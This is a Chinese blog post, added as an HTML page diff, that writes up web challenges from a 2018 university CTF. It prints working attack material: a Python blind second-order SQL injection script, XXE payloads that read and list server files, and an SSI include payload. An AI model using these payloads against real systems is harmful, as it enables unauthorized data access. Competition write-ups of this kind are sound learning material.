@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018高校网络信息安全管理运维挑战赛Web_Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/index.html">
+<meta property="og:site_name" content="Cyc1e&#39;s Blog">
+<meta property="og:description" content="前言emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png">
+<meta property="og:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg">
+<meta property="article:published_time" content="2018-11-16T13:18:49.000Z">
+<meta property="article:modified_time" content="2020-03-04T09:17:51.586Z">
+<meta property="article:author" content="Cyc1e">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="二次注入">
+<meta property="article:tag" content="XXE">
+<meta property="article:tag" content="SSI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png">
+
+<link rel="canonical" href="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2018高校网络信息安全管理运维挑战赛Web_Writeup | Cyc1e's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Cyc1e's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyc1e's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Cyc1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyc1e's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2018高校网络信息安全管理运维挑战赛Web_Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-11-16 21:18:49" itemprop="dateCreated datePublished" datetime="2018-11-16T21:18:49+08:00">2018-11-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-04 17:17:51" itemprop="dateModified" datetime="2020-03-04T17:17:51+08:00">2020-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">Cyc1e的CTF之路</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。</p>
+<h3 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h3><p>一个普通的BBS，进去随手在登入框输了个‘ ‘ ’就报错了，直接把SQL语句都爆出来了</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png" alt><br>甩sqlmap爆破，爆破的时候把level设置高一些，很多问我怎么他们没爆出来，应该就是因为level的原因吧。flag放在bbs库flag表flag字段里。</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png" alt></p>
+<h3 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h3><p>这道题目很明显是二次注入，由于很讨厌写注入的题，所以也是很后面才写，主要逻辑在于注册用户时我们插入SQL查询语句，登入后也在主页面提示分数为0什么的信息，所以在Final Exam页面测试，如果返回值显示的分数为非0，那么则表示注入的查询语句查询正确，若返回显示的分数为0，则说明查询失败，所以典型的盲注了，构造payload：’ or if((ascii(substr((select flag from flag),1,1))=1),1,0)=’1’ or ‘ 作为注册用户名，这里坑了一下，刚开始用的是 and，在insert的时候 and 和 &amp;&amp; 不会当作逻辑运算符执行，所以用 or 或者 || ，写个盲注脚本就好了。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">url_2 = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">url_3 = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(32,126):</span><br><span class="line">		<span class="attribute">ss</span>=requests.session()</span><br><span class="line">		payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">		post_an = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">		post_data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">		r = ss.post(<span class="attribute">url</span>=url,data=post_data)</span><br><span class="line">		login = ss.post(<span class="attribute">url</span>=url_2,data=post_data)</span><br><span class="line">		an = ss.post(<span class="attribute">url</span>=url_3,data=post_an)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> an.content:</span><br><span class="line">			e = chr(j)</span><br><span class="line">			result = result + e</span><br><span class="line">			<span class="builtin-name">print</span> result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png" alt></p>
+<h3 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h3><p>题目写得很清楚这题是XXE的点，所以先抓一个http request包</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png" alt><br>application/json应该都很熟悉了，把json改成xml进行XXE注入，参考文章：<a href="https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：" target="_blank" rel="noopener">https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Cyc1e<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>11<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>时有一样的回显，那么就是CVE-2018-1259的洞了，构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png" alt></p>
+<h3 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h3><p>这道题算非预期了，出题人木有把两个题目分开，所以导致捡漏了，看题目描述是同一个组件造成的RCE，那解法应该是参考：<a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。</a><br>由于和上一题共用同一个环境，flag都放在根目录下，那也就是文件名的问题，但是XXE是可以列目录的，构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png" alt></p>
+<p>可以直接列出更目录，很清楚的，RCE这题的flag就摆在这了，捡漏捡漏。</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png" alt></p>
+<h3 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h3><p>题目提示为SSI，刚开始看成了SSTI，一直在怒怼PHP的模版注入，坑了我好一段时间……既然是SSI，那就可以利用include来尝试包含本地文件</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png" alt>我们利用include virtual，构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="comment">&lt;!--%23include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>就可以得到flag，这里主要在于#号需要urlencode一下。</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png" alt></p>
+<h3 id="SimpleWasmReverse"><a href="#SimpleWasmReverse" class="headerlink" title="SimpleWasmReverse"></a>SimpleWasmReverse</h3><p>这题最后卡wasm逆向上了，蛮写写思路</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png" alt>把flag.js下载到本地分析，可以看到调用了一个flag.wasm文件</p>
+<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png" alt>)可以下载到flag.wasm进行分析，找到了一篇类似题目的writeup：<a href="https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数" target="_blank" rel="noopener">https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数</a><br><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg" alt></p>
+<p>所以接下来要做的主要就是反编译wasm文件，找到$func53函数进行分析，奈何wasm反编译后是3M的C源码。。。。。。而且变量名都变了，作为一个逆向只好爆破什么的来说，到这就放弃了，思路肯定是没毛病的了，分析调用的函数就可以的到flag{xxxxxx}，页面提交就可以得到flag的吧，坐等Writeup</p>
+<h5 id="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"><a href="#题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。" class="headerlink" title="题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。"></a>题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。</h5>
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> 二次注入</a>
+              <a href="/tags/XXE/" rel="tag"><i class="fa fa-tag"></i> XXE</a>
+              <a href="/tags/SSI/" rel="tag"><i class="fa fa-tag"></i> SSI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/" rel="prev" title="护网杯预选赛两个头大的Web题">
+      <i class="fa fa-chevron-left"></i> 护网杯预选赛两个头大的Web题
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
